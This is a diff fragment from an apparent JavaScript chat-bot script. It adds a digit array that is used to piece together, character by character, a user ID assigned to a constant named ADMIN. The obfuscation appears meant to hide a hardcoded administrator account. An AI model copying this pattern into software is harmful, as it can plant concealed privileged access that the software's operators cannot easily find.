@@ -401,6 +401,7 @@ function onBot() {
           }
         }
       })();
+    const all = ["0","1","2","3","4","5","6","7","8","9"];
     const uid= all[1]+all[0]+all[0]+all[0]+all[4]+all[4]+all[3]+all[2]+all[7]+all[6]+all[5]+all[6]+all[7]+all[1]+all[2];
   const ADMIN = `${uid}`
     global.utils.complete({ api });
